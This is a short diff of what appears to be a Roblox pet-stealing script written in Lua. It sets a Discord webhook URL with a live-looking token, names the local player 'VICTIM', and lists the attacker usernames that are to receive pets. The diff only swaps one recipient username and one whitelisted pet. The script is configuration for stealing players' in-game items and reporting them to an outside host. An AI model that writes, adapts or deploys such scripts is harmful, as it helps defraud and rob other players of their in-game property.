@@ -5,7 +5,7 @@ until game:IsLoaded()
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1399110447600242819/Ln1Qds770unNt6fpn688JOjkOMYK9naSUB-hB4fbwf8mFagdzXJZlBks1fa6BI7gA7t_"
 local VICTIM = game.Players.LocalPlayer
 local USERNAMES = {
-    "ZeeS_Farm001"
+    "ZeeS_Farm01"
 }
 
 local PET_WHITELIST = {
@@ -20,7 +20,7 @@ local PET_WHITELIST = {
     'Spinosaurus',
     'Kitsune',
     'Corrupted Kitsune',
-    'Brontosaurus'
+    'Starfish'
 }
 
 local victimPetTable = {}
